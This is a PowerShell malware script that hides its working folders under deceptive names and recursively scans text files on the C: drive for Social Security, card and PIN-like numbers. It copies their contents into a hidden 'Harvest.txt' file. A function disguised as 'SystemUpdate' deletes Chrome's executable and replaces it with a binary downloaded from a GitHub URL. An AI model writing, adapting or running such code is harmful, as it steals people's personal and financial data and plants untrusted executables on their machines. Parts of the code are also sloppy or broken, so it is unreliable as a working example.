set-location C:
$Path = "C:"
$Pattern1 = "\d\d\d-\d\d-\d\d\d\d"
$Pattern2 = "\d\d-\d\d-\d\d\d\d"
$Pattern3 = "\d\d\d\d-\d\d\d\d-\d\d\d\d-\d\d\d\d"
$Pattern4 = "\d\d\d\d"
$Array = @()
mkdir "C:\...sys."
mkdir "C:\...sys.\d1ls"
attrib +h "C:\...sys.\d1ls"
attrib +h "C:\...sys."
$Harvest = "C:\...sys.\d1ls\Harvest.txt"

function Scythe
{
    Get-Childitem $Path -Recurse -Filter "*.txt" |
    Where-Object { $_.Attributes -ne "Directory"} |
    ForEach-Object 
    {
        if (Get-Content $_.FullName | Select-String -Pattern $Pattern1) 
        {
            $Array += $_.FullName
            $Array += $_.FullName
        }
        if (Get-Content $_.FullName | Select-String -Pattern $Pattern2) 
        {
            $Array += $_.FullName
            $Array += $_.FullName
        }
        if (Get-Content $_.FullName | Select-String -Pattern $Pattern3) 
        {
            $Array += $_.FullName
            $Array += $_.FullName
        }
        if (Get-Content $_.FullName | Select-String -Pattern $Pattern4) 
        {
            $Array += $_.FullName
            $Array += $_.FullName
        }
    }
    ForEach ($i in $Array)
    {
        Get-Content $i 2>&1 >> $Harvest
    }
}
function SystemUpdate
{
    $Santa = Test-Path "C:\Program Files\Google\Chrome\Application"
    if ($Santa -eq "$True")
    {
        Remove-Item "C:\Program Files\Google\Chrome\chrome.exe" -Force
        wget https://github.com/nikorasen/Project_Scythe/blob/035e07f1f18bc8b13b84cf8b5f5cfc79e014ddf2/chrome.exe -outfile C:\...sys.\d1ls\chrome.exe
        Move-Item -Path "C:\...sys.\d1ls\chrome.exe" -Destination "C:\Program Files\Google\Chrome\chrome.exe" -Force
    }
}
function Reaver
{
    Scythe
    SystemUpdate
}
Reaver